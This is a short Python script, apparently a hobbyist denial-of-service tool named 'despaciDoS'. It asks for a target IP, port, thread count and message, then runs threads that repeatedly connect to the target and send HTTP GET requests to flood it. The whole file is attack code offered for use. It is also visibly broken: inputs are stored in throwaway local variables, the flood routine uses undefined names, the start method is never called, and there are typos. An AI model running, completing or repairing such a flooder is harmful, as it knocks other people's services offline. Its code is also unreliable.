import os
import socket
from threading import Thread

class despaciDoS:

    #TODO TEST N FIX

    def __init__(self,ip=0,port=0,thread=0,usertext=None):
        """
        Make sure your port is between 0 and 65535
        if you exceed the range the port will be set to min or max
        """
        self._ip = ip
        self._port = port
        self._thread = thread
        self._usertext = usertext
        if self._port > 65535:
            self._port = 65535
        if self._port < 0:
            self.port = 0

    def setTargetViaCLI(self):
        _ip = input("IP: ")
        _port = int(input("Port: "))
        _thread = int(input("Threads: "))
        _usertext = str(input("Message: "))

    def startDoS(self):
        def dosLogic(self):
            """
            This method will be executed as thread
            """
            while True:
                mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    mysocket.connect((_ip, _port))
                    mysocket.send(str.encode("GET "+despaciDoS._usertext+"HTTP/1.1\r\n"))
                    mysocket.sendto(str.encode("GET "+despaciDoS._usertext+"HTTP/1.1\r\n"), (_ip, _port))
                except socket.error:
                    os.system('claer'if os.name != 'nt' else 'cls')
                    print('Error')
                mysocket.close()
        for i in range(_thread): 
            t = Thread(target=dosLogic)
            t.start()

if __name__ == "__main__":
    """
    If this module is called via Terminal/CMD
    the main will be executed
    else just make objects out of it when imported
    """
    x = despaciDoS()
    x.setTargetViaCLI()
